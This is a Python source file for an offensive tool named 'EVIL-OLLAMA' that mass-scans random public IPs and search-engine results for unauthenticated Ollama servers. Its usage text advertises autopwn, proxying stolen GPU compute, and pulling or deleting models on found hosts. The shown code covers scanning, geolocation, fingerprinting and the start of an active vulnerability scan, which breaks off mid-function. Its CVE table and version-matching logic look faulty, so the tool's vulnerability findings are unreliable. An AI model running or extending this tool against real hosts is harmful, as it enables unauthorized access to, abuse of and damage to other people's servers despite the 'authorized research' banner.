#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                🦙 EVIL-OLLAMA v3.0                            ║
║  Exposed Ollama Instance Hunter & Proxy Tool                ║
║  For authorized security research & bug bounty purposes only           ║
╚══════════════════════════════════════════════════════════════════════════╝

Usage:
  # -- SCANNING --
  ./launcher.sh scan --random 10000           # Async TCP scan random IPs
  ./launcher.sh scan --cidr 0.0.0.0/8         # CIDR range scan
  ./launcher.sh scan --file ips.txt           # IP list from file
  ./launcher.sh scan --shodan API_KEY         # Shodan search
  ./launcher.sh scan --censys ID:SECRET       # Censys search
  ./launcher.sh scan --fofa EMAIL:KEY         # FOFA search
  ./launcher.sh scan --dns example.com        # DNS-based discovery
  ./launcher.sh scan --ct example.com         # Certificate transparency logs

  # -- EXPLOIT / VULN SCAN --
  ./launcher.sh vuln --target 1.2.3.4:11434   # Full vulnerability scan
  ./launcher.sh vuln --all                    # Vuln scan all found instances
  ./launcher.sh exploit --cve CVE-2024-37032 --target 1.2.3.4:11434

  # -- MODEL OPERATIONS --
  ./launcher.sh models --target 1.2.3.4:11434       # List models
  ./launcher.sh models --pull target model_name     # Download model
  ./launcher.sh models --analyze target model_name  # Analyze model details
  
  # -- DEPLOY (pull model onto remote) --
  ./launcher.sh deploy --model gemma:2b --all        # Pull model onto all found instances
  ./launcher.sh deploy --model gemma:2b --target 1.2.3.4:11434  # Pull to specific target
  
  # -- PUSH (push model from remote to registry) --
  ./launcher.sh push --target 1.2.3.4:11434 --model mymodel:tag
  
  # -- CREATE (create model from Modelfile) --
  ./launcher.sh create --target 1.2.3.4:11434 --model newmodel --modelfile ./Modelfile
  ./launcher.sh create --target 1.2.3.4:11434 --model newmodel --from base:latest
  
  # -- COPY (copy model within instance) --
  ./launcher.sh copy --target 1.2.3.4:11434 --source old:latest --dest new:latest
  
  # -- REMOVE (delete model from instance) --
  ./launcher.sh remove --target 1.2.3.4:11434 --model model:tag
  
  # -- PS (list running models) --
  ./launcher.sh ps --target 1.2.3.4:11434
  
  # -- EMBED (generate embeddings) --
  ./launcher.sh embed --target 1.2.3.4:11434 --model nomic-embed-text --prompt "hello world"
  
  # -- GENERATE (generate completion) --
  ./launcher.sh generate --target 1.2.3.4:11434 --model gemma:2b --prompt "tell me a joke"

  # -- PROXY --
  ./launcher.sh proxy --target 1.2.3.4:11434   # Start proxy (OpenAI compatible)
  ./launcher.sh proxy --socks 1.2.3.4:11434    # SOCKS5 proxy mode
  ./launcher.sh proxy --chain                   # Chain multiple instances

  # -- CHAT --
  ./launcher.sh chat --target 1.2.3.4:11434    # Interactive chat
  ./launcher.sh chat --batch prompts.txt       # Batch prompt execution

  # -- FINGERPRINT --
  ./launcher.sh fingerprint --target 1.2.3.4:11434  # Deep instance analysis
  ./launcher.sh fingerprint --all                   # Fingerprint all

  # -- EXPORT --
  ./launcher.sh export --format html           # Export to HTML report
  ./launcher.sh export --format json           # Export to JSON

  # -- AUTO-PWN --
  ./launcher.sh autopwn --random 5000          # Scan → Vuln Scan → Proxy

  # -- MONITOR (CLI only, no web) --
  ./launcher.sh monitor --interval 3600        # Continuous scan daemon
"""

import asyncio
import aiohttp
import json
import random
import ipaddress
import argparse
import sys
import os
import time
import subprocess
import socket
import hashlib
import csv
import io
import ssl
import base64
import urllib.parse
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any, Set
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# CONFIGURATION
# ============================================================
VERSION = "3.0.0"
DEFAULT_OLLAMA_PORT = 11434
SCAN_TIMEOUT = 4
MAX_CONCURRENT = 1000
FOUND_DB = "evilollama_instances.json"
CONFIG_FILE = "evilollama_config.json"
USER_AGENT = "EvilOllama/3.0 (Security Research)"

# Colors for terminal output
class C:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CLEAR = '\033[2J\033[H'

BANNER = f"""
{C.BOLD}{C.MAGENTA}
╔══════════════════════════════════════════════════════════════════╗
║                    🦙 EVIL-OLLAMA v{VERSION}                       ║
║         Exposed Ollama Instance Hunter & Proxy Tool              ║
║              For authorized security testing only                ║
╚══════════════════════════════════════════════════════════════════╝
{C.END}
"""

# Known CVEs for Ollama versions — comprehensive
CVE_DATABASE = {
    "0.0.0": [
        {"id": "CVE-2024-37032", "desc": "RCE via crafted model file (path traversal in model import)", "severity": "CRITICAL", "cvss": 9.1},
        {"id": "CVE-2024-39720", "desc": "Prompt injection via crafted system prompt", "severity": "HIGH", "cvss": 7.5},
    ],
    "0.1.0": [
        {"id": "CVE-2024-37032", "desc": "RCE via crafted model file (path traversal in model import)", "severity": "CRITICAL", "cvss": 9.1},
        {"id": "CVE-2024-39721", "desc": "SSRF in model pulling mechanism", "severity": "HIGH", "cvss": 7.5},
        {"id": "CVE-2024-39722", "desc": "Path traversal in API endpoints", "severity": "HIGH", "cvss": 7.3},
    ],
    "0.1.15": [
        {"id": "CVE-2024-37032", "desc": "RCE via crafted model file", "severity": "CRITICAL", "cvss": 9.1},
        {"id": "CVE-2024-39720", "desc": "Prompt injection", "severity": "HIGH", "cvss": 7.5},
        {"id": "CVE-2024-39721", "desc": "SSRF in model pulling", "severity": "HIGH", "cvss": 7.5},
        {"id": "CVE-2024-39722", "desc": "Path traversal", "severity": "HIGH", "cvss": 7.3},
    ],
    "0.1.29": [
        {"id": "CVE-2024-37032", "desc": "RCE via crafted model file", "severity": "CRITICAL", "cvss": 9.1},
        {"id": "CVE-2024-39720", "desc": "Prompt injection", "severity": "HIGH", "cvss": 7.5},
    ],
    "0.1.34": [
        {"id": "CVE-2024-37032", "desc": "RCE via crafted model file", "severity": "CRITICAL", "cvss": 9.1},
    ],
    "0.1.47": [],  # First patched version for CVE-2024-37032
    "0.2.0": [
        {"id": "CVE-2025-23104", "desc": "API authentication bypass in /api/pull", "severity": "HIGH", "cvss": 8.2},
    ],
    "0.2.5": [
        {"id": "CVE-2025-23104", "desc": "API authentication bypass", "severity": "HIGH", "cvss": 8.2},
    ],
    "0.3.0": [],
    "0.3.6": [],
}

# Reserved IP ranges — blocked from scanning
RESERVED_RANGES = [
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('224.0.0.0/4'),
    ipaddress.ip_network('240.0.0.0/4'),
    ipaddress.ip_network('255.255.255.255/32'),
]

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def log(msg: str, level: str = "INFO", end: str = "\n"):
    """Colorful logging"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "INFO": C.BLUE, "OK": C.GREEN, "WARN": C.YELLOW,
        "ERROR": C.RED, "FOUND": C.MAGENTA, "CVE": C.RED,
        "GEO": C.CYAN, "VULN": C.RED, "MODEL": C.GREEN,
        "PROXY": C.YELLOW, "CHAT": C.CYAN, "STEP": C.HEADER,
        "DEBUG": C.DIM
    }
    c = colors.get(level, C.END)
    icon_map = {
        "INFO": "ℹ", "OK": "✓", "WARN": "⚠", "ERROR": "✗",
        "FOUND": "🦙", "CVE": "💀", "GEO": "📍", "VULN": "🔴",
        "MODEL": "📦", "PROXY": "🔌", "CHAT": "💬", "STEP": "▶",
        "DEBUG": "🔍"
    }
    icon = icon_map.get(level, " ")
    print(f"{c}[{timestamp}] [{icon} {level:5s}]{C.END} {msg}", end=end)

def load_json(path: str) -> list:
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_json(path: str, data: list):
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def save_found(instance: dict) -> bool:
    db = load_json(FOUND_DB)
    key = f"{instance.get('ip')}:{instance.get('port', DEFAULT_OLLAMA_PORT)}"
    if not any(f"{x.get('ip')}:{x.get('port', DEFAULT_OLLAMA_PORT)}" == key for x in db):
        db.append(instance)
        save_json(FOUND_DB, db)
        log(f"💾 Saved {instance['ip']}:{instance.get('port', DEFAULT_OLLAMA_PORT)} to {FOUND_DB}", "FOUND")
        return True
    return False

def load_found() -> list:
    return load_json(FOUND_DB)

def get_config() -> dict:
    defaults = {
        "telegram_token": "",
        "telegram_chat_id": "",
        "shodan_key": "",
        "censys_id": "",
        "censys_secret": "",
        "fofa_email": "",
        "fofa_key": "",
        "notify_on_find": False,
        "auto_export": False,
        "export_format": "json",
        "monitor_interval": 3600,
        "proxy_port_base": 9080,
        "max_scan_threads": 1000,
        "scan_timeout": 4,
        "block_internal": True,
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                cfg = json.load(f)
                defaults.update(cfg)
        except:
            pass
    return defaults

def save_config(config: dict):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)
    log("Config saved", "OK")

def is_public_ip(ip_str: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_multicast or ip_obj.is_reserved:
            return False
        return True
    except:
        return False

def bytes_to_human(n: int) -> str:
    """Convert bytes to human readable"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if n < 1024:
            return f"{n:.2f} {unit}"
        n /= 1024
    return f"{n:.2f} PB"

def elapsed_str(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

# ============================================================
# IP GENERATION
# ============================================================

def generate_random_ips(count: int) -> List[str]:
    """Generate N random public IPv4 addresses (weighted by real-world allocation)"""
    ips: Set[str] = set()
    
    # Weight mapping: first_octet -> weight (higher = more likely)
    def get_weight(octet: int) -> int:
        if 1 <= octet <= 9: return 5       # US DoD/Apple/Level 3
        if octet in [12, 15, 16, 17, 18, 19, 20, 21]: return 8   # AT&T/HP/AWS/Google
        if octet in [23, 24, 25, 26, 27]: return 10               # Comcast/Sprint
        if octet in [31, 32, 33, 34, 35, 36, 37]: return 12       # UK/DT/HP/MS
        if octet in [40, 41, 42, 43, 44, 45, 46, 47]: return 15   # China/MS
        if octet in [50, 51, 52, 53, 54]: return 20                # ARIN/AWS
        if 60 <= octet <= 69: return 25     # APNIC/China/Europe
        if 70 <= octet <= 89: return 30     # Dense Europe/US
        if 90 <= octet <= 109: return 35    # Dense allocation
        if 110 <= octet <= 130 and octet != 127: return 40  # Dense
        if 131 <= octet <= 150: return 45    # Dense
        if 151 <= octet <= 170: return 50    # Very dense (RIPE/ARIN)
        if 171 <= octet <= 190: return 55    # Very dense
        if 191 <= octet <= 210: return 60    # Most dense (RIPE/ARIN/APNIC)
        if 211 <= octet <= 223: return 40    # Asia/APNIC
        return 1
    
    first_octets = list(range(1, 224))
    weights = [get_weight(o) for o in first_octets]
    
    while len(ips) < count:
        first = random.choices(first_octets, weights=weights, k=1)[0]
        ip_str = f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if is_public_ip(ip_str):
            ips.add(ip_str)
    return list(ips)

def ips_from_cidr(cidr: str) -> List[str]:
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in net.hosts()]
    except Exception as e:
        log(f"Invalid CIDR: {e}", "ERROR")
        return []

def ips_from_file(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception as e:
        log(f"Error reading file: {e}", "ERROR")
        return []

# ============================================================
# DNS-BASED DISCOVERY
# ============================================================

def discover_by_dns(domain: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    """Discover Ollama instances by DNS — check common subdomain patterns"""
    log(f"🔍 DNS discovery for {domain}...", "INFO")
    found = []
    
    subdomains = [
        "ollama", "api.ollama", "llm", "ai", "model", "models",
        "inference", "ml", "deeplearning", "gpu", "compute",
        "llama", "llama-api", "ai-api", "ml-api", "inference-api",
        "chat", "chat-api", "bot", "assistant", "ai-assistant",
    ]
    
    for sub in subdomains:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            if is_public_ip(ip):
                log(f"   → {fqdn} resolves to {ip}", "FOUND")
                instance = {
                    "ip": ip, "port": port, "url": f"http://{ip}:{port}",
                    "hostname": fqdn, "models": [], "model_count": 0,
                    "version": "unknown", "source": "dns_discovery",
                    "timestamp": datetime.now().isoformat(),
                    "cves": [], "geo": None, "fingerprint": None,
                    "response_time_ms": 0
                }
                found.append(instance)
                save_found(instance)
        except socket.gaierror:
            pass
    
    log(f"DNS discovery found {len(found)} potential hosts", "OK")
    return found

# ============================================================
# CERTIFICATE TRANSPARENCY DISCOVERY
# ============================================================

def discover_by_ct(domain: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    """Discover instances via Certificate Transparency logs"""
    log(f"🔍 CT log search for {domain}...", "INFO")
    found = []
    
    try:
        import requests
        # Use crt.sh for CT log search
        url = f"https://crt.sh/?q=%25{domain}&output=json"
        resp = requests.get(url, timeout=30, headers={"User-Agent": USER_AGENT})
        if resp.status_code == 200:
            data = resp.json()
            subdomains = set()
            for entry in data:
                name = entry.get("name_value", "")
                for n in name.split("\n"):
                    n = n.strip()
                    if n.endswith(domain) and n not in subdomains:
                        subdomains.add(n)
            
            log(f"   Found {len(subdomains)} subdomains from CT logs", "INFO")
            
            # Resolve each subdomain
            for sub in list(subdomains)[:200]:  # Limit to 200
                try:
                    ip = socket.gethostbyname(sub.lstrip("*."))
                    if is_public_ip(ip):
                        instance = {
                            "ip": ip, "port": port, "url": f"http://{ip}:{port}",
                            "hostname": sub, "models": [], "model_count": 0,
                            "version": "unknown", "source": "ct_discovery",
                            "timestamp": datetime.now().isoformat(),
                            "cves": [], "geo": None, "fingerprint": None,
                            "response_time_ms": 0
                        }
                        if not any(x.get("ip") == ip for x in found):
                            found.append(instance)
                            save_found(instance)
                            log(f"   → {sub} → {ip}", "FOUND")
                except:
                    pass
    except ImportError:
        log("requests library required for CT search", "ERROR")
    except Exception as e:
        log(f"CT search error: {e}", "ERROR")
    
    log(f"CT discovery found {len(found)} hosts", "OK")
    return found

# ============================================================
# OLLAMA SCANNER (Async TCP)
# ============================================================

async def check_ollama(ip: str, port: int = DEFAULT_OLLAMA_PORT, 
                        semaphore: asyncio.Semaphore = None) -> Optional[dict]:
    if semaphore:
        async with semaphore:
            return await _check(ip, port)
    else:
        return await _check(ip, port)

async def _check(ip: str, port: int) -> Optional[dict]:
    """Check if IP:port runs Ollama — probe multiple endpoints"""
    url_tags = f"http://{ip}:{port}/api/tags"
    url_version = f"http://{ip}:{port}/api/version"
    
    try:
        timeout = aiohttp.ClientTimeout(total=SCAN_TIMEOUT)
        connector = aiohttp.TCPConnector(limit=1)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            # First check /api/tags
            async with session.get(url_tags, headers={"User-Agent": USER_AGENT}) as resp:
                if resp.status != 200:
                    return None
                try:
                    data = await resp.json()
                except:
                    return None
                
                if "models" not in data:
                    return None
                
                models = [m.get("name", "unknown") for m in data.get("models", [])]
                version = "unknown"
                
                # Get version
                try:
                    async with session.get(url_version, headers={"User-Agent": USER_AGENT}) as vresp:
                        if vresp.status == 200:
                            vdata = await vresp.json()
                            version = vdata.get("version", "unknown")
                except:
                    pass
                
                # Get running models
                running_models = []
                try:
                    async with session.get(f"http://{ip}:{port}/api/ps", 
                                         headers={"User-Agent": USER_AGENT}) as psresp:
                        if psresp.status == 200:
                            psdata = await psresp.json()
                            running_models = [m.get("name", "?") for m in psdata.get("models", [])]
                except:
                    pass
                
                # Calculate model sizes
                total_size = 0
                try:
                    for m in data.get("models", []):
                        total_size += m.get("size", 0) or 0
                except:
                    pass
                
                instance = {
                    "ip": ip,
                    "port": port,
                    "url": f"http://{ip}:{port}",
                    "models": models,
                    "model_count": len(models),
                    "running_models": running_models,
                    "running_count": len(running_models),
                    "total_size_bytes": total_size,
                    "total_size_human": bytes_to_human(total_size),
                    "version": version,
                    "timestamp": datetime.now().isoformat(),
                    "tags_response": data,
                    "fingerprint": None,
                    "geo": None,
                    "cves": check_cves(version),
                    "source": "scan",
                    "response_time_ms": 0
                }
                return instance
                
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return None

async def scan_ips(ips: List[str], port: int = DEFAULT_OLLAMA_PORT, 
                   max_concurrent: int = MAX_CONCURRENT) -> List[dict]:
    """Async scan a list of IPs with progress"""
    semaphore = asyncio.Semaphore(max_concurrent)
    found = []
    total = len(ips)
    
    log(f"🎯 Scanning {total} hosts on port {port} (concurrency: {max_concurrent})", "INFO")
    
    start_time = time.time()
    batch_size = max_concurrent * 2
    
    for batch_start in range(0, total, batch_size):
        batch_end = min(batch_start + batch_size, total)
        batch = ips[batch_start:batch_end]
        tasks = [check_ollama(ip, port, semaphore) for ip in batch]
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                found.append(result)
                models_str = ", ".join(result["models"][:4])
                if len(result["models"]) > 4:
                    models_str += f" ... (+{len(result['models'])-4})"
                run_str = f" | 🏃 {result['running_count']} running" if result['running_count'] else ""
                cve_str = f" | 💀 {len(result['cves'])} CVE" if result['cves'] else ""
                log(f"🦙 {result['ip']}:{result['port']} | v{result['version']}{cve_str} | {models_str}{run_str}", "FOUND")
                save_found(result)
        
        elapsed = time.time() - start_time
        rate = batch_end / elapsed if elapsed > 0 else 0
        pct = (batch_end / total) * 100
        eta = (total - batch_end) / rate if rate > 0 else 0
        
        # Progress bar
        bar_len = 30
        filled = int(bar_len * batch_end / total)
        bar = '█' * filled + '░' * (bar_len - filled)
        sys.stdout.write(f"\r{C.DIM}[{bar}] {pct:.0f}% | {batch_end}/{total} | {rate:.0f}/s | Found: {len(found)} | ETA: {elapsed_str(eta)}{C.END}  ")
        sys.stdout.flush()
    
    print()
    elapsed = time.time() - start_time
    log(f"✅ Scanned {total} hosts in {elapsed_str(elapsed)} — Found {len(found)} instance(s)", "OK")
    return found

# ============================================================
# SHODAN / CENSYS / FOFA INTEGRATION
# ============================================================

def search_shodan(api_key: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    log("🔎 Searching Shodan for exposed Ollama...", "INFO")
    try:
        import requests
        found = []
        
        for page in range(1, 6):  # Up to 5 pages
            query = f"port:{port} ollama"
            url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={urllib.parse.quote(query)}&page={page}"
            resp = requests.get(url, timeout=30)
            
            if resp.status_code == 401:
                log("Invalid Shodan API key", "ERROR")
                return []
            if resp.status_code != 200:
                break
            
            data = resp.json()
            total = data.get("total", 0)
            log(f"📊 Shodan: {total} total instances (page {page})", "OK")
            
            for match in data.get("matches", []):
                ip_str = match.get("ip_str", "")
                if ip_str:
                    instance = {
                        "ip": ip_str, "port": match.get("port", port),
                        "url": f"http://{ip_str}:{match.get('port', port)}",
                        "models": [], "model_count": 0,
                        "version": match.get("version", "unknown"),
                        "timestamp": datetime.now().isoformat(),
                        "source": "shodan",
                        "hostname": match.get("hostnames", [None])[0] if match.get("hostnames") else "",
                        "geo": {
                            "country": match.get("location", {}).get("country_name", ""),
                            "city": match.get("location", {}).get("city", ""),
                            "org": match.get("org", ""),
                            "isp": match.get("isp", ""),
                            "lat": match.get("location", {}).get("latitude", 0),
                            "lon": match.get("location", {}).get("longitude", 0)
                        },
                        "cves": check_cves(match.get("version", "unknown")),
                        "fingerprint": None, "response_time_ms": 0
                    }
                    found.append(instance)
                    save_found(instance)
                    log(f"🦙 Shodan: {ip_str} | {instance['geo'].get('country','?')}", "FOUND")
            
            if page >= data.get("page_count", 1):
                break
        
        return found
    except ImportError:
        log("requests library required. pip install requests", "ERROR")
        return []
    except Exception as e:
        log(f"Shodan search error: {e}", "ERROR")
        return []

def search_censys(api_id: str, api_secret: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    log("🔎 Searching Censys for exposed Ollama...", "INFO")
    try:
        import requests
        from requests.auth import HTTPBasicAuth
        
        found = []
        query = f"services.port={port} and (services.service_name=OLLAMA or services.http.response.body='ollama' or services.http.response.body='api/tags')"
        auth = HTTPBasicAuth(api_id, api_secret)
        
        for page in range(1, 6):
            resp = requests.get(
                "https://search.censys.io/api/v2/hosts/search",
                auth=auth,
                params={"q": query, "per_page": 100, "page": page},
                timeout=30
            )
            if resp.status_code != 200:
                break
            
            data = resp.json()
            hits = data.get("result", {}).get("hits", [])
            if not hits:
                break
            
            log(f"📊 Censys: {len(hits)} hits (page {page})", "OK")
            
            for hit in hits:
                ip_str = hit.get("ip", "")
                if ip_str:
                    loc = hit.get("location", {})
                    coords = loc.get("coordinates", {}) if isinstance(loc.get("coordinates"), dict) else {}
                    instance = {
                        "ip": ip_str, "port": port,
                        "url": f"http://{ip_str}:{port}",
                        "models": [], "model_count": 0,
                        "version": "unknown",
                        "timestamp": datetime.now().isoformat(),
                        "source": "censys",
                        "hostname": "",
                        "geo": {
                            "country": loc.get("country", ""), "city": loc.get("city", ""),
                            "org": "", "isp": "",
                            "lat": coords.get("latitude", 0), "lon": coords.get("longitude", 0)
                        },
                        "cves": [], "fingerprint": None, "response_time_ms": 0
                    }
                    found.append(instance)
                    save_found(instance)
                    log(f"🦙 Censys: {ip_str} | {instance['geo'].get('country','?')}", "FOUND")
        
        return found
    except ImportError:
        log("requests library required", "ERROR")
        return []
    except Exception as e:
        log(f"Censys search error: {e}", "ERROR")
        return []

def search_fofa(email: str, key: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    log("🔎 Searching FOFA for exposed Ollama...", "INFO")
    try:
        import requests
        found = []
        query = f'port="{port}" && (body="ollama" || body="api/tags" || body="llama")'
        b64_query = base64.b64encode(query.encode()).decode()
        
        url = f"https://fofa.info/api/v1/search/all?email={email}&key={key}&qbase64={b64_query}&size=100&fields=ip,port,country,city,org,host"
        resp = requests.get(url, timeout=30)
        if resp.status_code != 200:
            log(f"FOFA error: {resp.status_code}", "ERROR")
            return []
        
        data = resp.json()
        if data.get("error"):
            log(f"FOFA API error: {data.get('errmsg', 'unknown')}", "ERROR")
            return []
        
        results = data.get("results", [])
        log(f"📊 FOFA found {len(results)} potential instances", "OK")
        
        for row in results:
            if len(row) >= 2:
                ip_str = row[0]
                pt = row[1] if len(row) > 1 else port
                country = row[2] if len(row) > 2 else ""
                city = row[3] if len(row) > 3 else ""
                org = row[4] if len(row) > 4 else ""
                hostname = row[5] if len(row) > 5 else ""
                
                if ip_str:
                    instance = {
                        "ip": ip_str, "port": int(pt) if pt else port,
                        "url": f"http://{ip_str}:{pt}",
                        "models": [], "model_count": 0,
                        "version": "unknown", "timestamp": datetime.now().isoformat(),
                        "source": "fofa", "hostname": hostname,
                        "geo": {"country": country, "city": city, "org": org},
                        "cves": [], "fingerprint": None, "response_time_ms": 0
                    }
                    found.append(instance)
                    save_found(instance)
                    log(f"🦙 FOFA: {ip_str} | {country} | {org}", "FOUND")
        
        return found
    except ImportError:
        log("requests library required", "ERROR")
        return []
    except Exception as e:
        log(f"FOFA search error: {e}", "ERROR")
        return []

# ============================================================
# GEOLOCATION
# ============================================================

def geolocate_ip(ip: str) -> Optional[dict]:
    """Geolocate IP using ip-api.com"""
    try:
        import requests
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,timezone,query", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", ""),
                    "countryCode": data.get("countryCode", ""),
                    "region": data.get("regionName", ""),
                    "city": data.get("city", ""),
                    "zip": data.get("zip", ""),
                    "lat": data.get("lat", 0),
                    "lon": data.get("lon", 0),
                    "isp": data.get("isp", ""),
                    "org": data.get("org", ""),
                    "as": data.get("as", ""),
                    "timezone": data.get("timezone", "")
                }
    except:
        pass
    return None

def batch_geolocate(instances: List[dict]) -> List[dict]:
    for inst in instances:
        if not inst.get("geo"):
            geo = geolocate_ip(inst["ip"])
            if geo:
                inst["geo"] = geo
                log(f"📍 {inst['ip']} → {geo.get('city','?')}, {geo.get('country','?')} | {geo.get('isp','?')}", "GEO")
            time.sleep(0.3)
    return instances

# ============================================================
# CVE CHECK
# ============================================================

def check_cves(version: str) -> List[dict]:
    """Check known CVEs for an Ollama version"""
    if not version or version == "unknown":
        # If version unknown, assume vulnerable
        return [{"id": "UNKNOWN-VERSION", "desc": "Version not detectable — likely vulnerable", "severity": "MEDIUM", "cvss": 5.0}]
    
    cves = []
    matched_ver = None
    
    # Find the highest version in our DB that is <= detected version
    for ver in sorted(CVE_DATABASE.keys(), key=lambda x: [int(p) if p.isdigit() else 999 for p in x.split(".")]):
        try:
            detected_parts = [int(p) for p in version.split(".")]
            db_parts = [int(p) for p in ver.split(".")]
            if detected_parts <= db_parts:
                matched_ver = ver
                break
        except:
            pass
    
    if matched_ver:
        cves = CVE_DATABASE.get(matched_ver, [])
    
    return cves

# ============================================================
# ADVANCED FINGERPRINTING
# ============================================================

def fingerprint_instance(target: str) -> dict:
    """Deep fingerprint a remote Ollama instance"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    import requests
    info = {
        "version": "unknown",
        "models": [], "model_count": 0,
        "running_models": [], "running_count": 0,
        "total_model_size_bytes": 0, "total_model_size_human": "0 B",
        "response_time_ms": {},
        "server_headers": {}, "cves": [],
        "accessible_endpoints": [], "gpu_info": None,
        "model_details": [], "process_info": None,
    }
    
    endpoints = [
        ("/api/tags", "Model List"),
        ("/api/version", "Version"),
        ("/api/ps", "Running Models"),
        ("/", "Root"),
        ("/v1/models", "OpenAI Compatible"),
        ("/api/show", "Show Model"),
        ("/api/blobs", "Blobs List"),
        ("/api/pull", "Pull API"),
        ("/api/push", "Push API"),
        ("/api/create", "Create API"),
        ("/api/delete", "Delete API"),
        ("/api/copy", "Copy API"),
        ("/api/embed", "Embeddings"),
        ("/api/embeddings", "Embeddings API"),
        ("/docs", "Docs"),
        ("/metrics", "Metrics"),
        ("/debug", "Debug"),
        ("/health", "Health"),
        ("/status", "Status"),
    ]
    
    start = time.time()
    for path, desc in endpoints:
        try:
            t0 = time.time()
            resp = requests.get(f"{target}{path}", timeout=5, 
                              headers={"User-Agent": USER_AGENT})
            rt = int((time.time() - t0) * 1000)
            
            if resp.status_code == 200:
                info["accessible_endpoints"].append(f"{path} ({desc})")
                info["response_time_ms"][path] = rt
                
                if path == "/api/version":
                    try:
                        v = resp.json().get("version", "unknown")
                        info["version"] = v
                        info["cves"] = check_cves(v)
                    except: pass
                
                elif path == "/api/tags":
                    try:
                        models_data = resp.json().get("models", [])
                        details = []
                        for m in models_data:
                            md = {
                                "name": m.get("name", "?"),
                                "size_bytes": m.get("size", 0),
                                "size_human": bytes_to_human(m.get("size", 0)),
                                "modified": m.get("modified_at", ""),
                            }
                            details.append(md)
                        info["models"] = [m.get("name", "?") for m in models_data]
                        info["model_count"] = len(models_data)
                        info["model_details"] = details
                        total_size = sum(m.get("size", 0) for m in models_data)
                        info["total_model_size_bytes"] = total_size
                        info["total_model_size_human"] = bytes_to_human(total_size)
                    except: pass
                
                elif path == "/api/ps":
                    try:
                        ps_data = resp.json()
                        info["running_models"] = [m.get("name", "?") for m in ps_data.get("models", [])]
                        info["running_count"] = len(ps_data.get("models", []))
                        # Extract GPU info
                        for m in ps_data.get("models", []):
                            details = m.get("details", {})
                            if details.get("gpu"):
                                info["gpu_info"] = str(details.get("gpu"))
                                break
                        info["process_info"] = ps_data
                    except: pass
                
                elif path == "/api/show" and info["models"]:
                    # Check first model
                    try:
                        show_resp = requests.post(f"{target}/api/show",
                            json={"model": info["models"][0]}, timeout=5)
                        if show_resp.status_code == 200:
                            info["model_show_sample"] = show_resp.json()
                    except: pass
            elif resp.status_code == 404:
                pass  # Expected for most endpoints
            elif resp.status_code == 405:
                info["accessible_endpoints"].append(f"{path} ({desc}) [405 Method Not Allowed]")
        except requests.exceptions.ConnectionError:
            if path == "/":
                info["status"] = "unreachable"
                return info
        except:
            pass
    
    info["response_time_ms"]["total"] = round((time.time() - start) * 1000)
    info["status"] = "active"
    
    return info

# ============================================================
# VULNERABILITY SCANNER
# ============================================================

def scan_vulnerabilities(target: str) -> dict:
    """Actively test for vulnerabilities on an Ollama instance"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    log(f"🔴 Vulnerability scanning {target}...", "VULN")
    import requests
    results = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "vulnerabilities": [],
        "info": [],
        "scan_summary": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    }
    
    # 1. Check for no authentication (default exposure)
    try:
        resp = requests.get(f"{target}/api/tags", timeout=5)
        if resp.status_code == 200:
            results["vulnerabilities"].append({
                "id": "EVIL-NO-AUTH",
                "name": "No Authentication Required",
                "desc": "The Ollama API is fully accessible without any authentication",
                "severity": "HIGH", "cvss": 7.5,
                "endpoint": "/api/tags",
                "evidence": f"HTTP 200 — {len(resp.json().get('models', []))} models accessible",
                "impact": "Unauthenticated access to all models, GPU compute, and data"
            })
            results["scan_summary"]["high"] += 1
    except: pass
    
    # 2. Check for CVE-2024-37032 (Path traversal in model import)
    try:
        resp = requests.get(f"{target}/api/pull", timeout=5)
        if resp.status_code in [200, 405]:
            results["vulnerabilities"].append({
                "id": "CVE-2024-37032",
